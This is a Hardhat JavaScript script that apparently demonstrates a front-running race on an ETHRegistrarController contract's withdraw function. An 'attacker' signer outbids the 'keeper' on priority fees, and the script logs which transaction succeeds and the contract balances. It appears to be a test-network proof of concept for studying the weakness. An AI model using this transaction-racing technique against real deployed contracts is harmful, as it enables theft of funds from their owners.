const { ethers } = require("hardhat");
const fs = require("fs");

async function main() {
  const CONTRACT_ADDRESS = process.env.CONTRACT || "0x...";
  const [keeper, attacker] = await ethers.getSigners().then(s => [s[0], s[1]]);
  const abi = JSON.parse(fs.readFileSync("abi/ETHRegistrarController.json", "utf8"));

  const contractKeeper = new ethers.Contract(CONTRACT_ADDRESS, abi, keeper);
  const contractAttacker = new ethers.Contract(CONTRACT_ADDRESS, abi, attacker);

  // fund contract
  await keeper.sendTransaction({ to: CONTRACT_ADDRESS, value: ethers.utils.parseEther("0.5") });

  console.log("Balance before:", (await ethers.provider.getBalance(CONTRACT_ADDRESS)).toString());

  // Keeper prepares a withdraw tx but we let attacker send a competing tx quickly
  // Attacker sends with higher gasPrice (or use EIP-1559 maxPriorityFee)
  const attackerTxPromise = contractAttacker.withdraw({ maxPriorityFeePerGas: ethers.utils.parseUnits("3", "gwei"), maxFeePerGas: ethers.utils.parseUnits("100", "gwei") });

  // Slight delay to mimic race
  await new Promise(r => setTimeout(r, 10)); // 10ms

  // Keeper sends its withdraw
  const keeperTxPromise = contractKeeper.withdraw({ maxPriorityFeePerGas: ethers.utils.parseUnits("1", "gwei"), maxFeePerGas: ethers.utils.parseUnits("50", "gwei") });

  const [attackerTx, keeperTx] = await Promise.allSettled([attackerTxPromise, keeperTxPromise]);

  console.log("Attacker result:", attackerTx.status);
  console.log("Keeper result:", keeperTx.status);

  console.log("Balance after:", (await ethers.provider.getBalance(CONTRACT_ADDRESS)).toString());
}

main().catch(console.error);
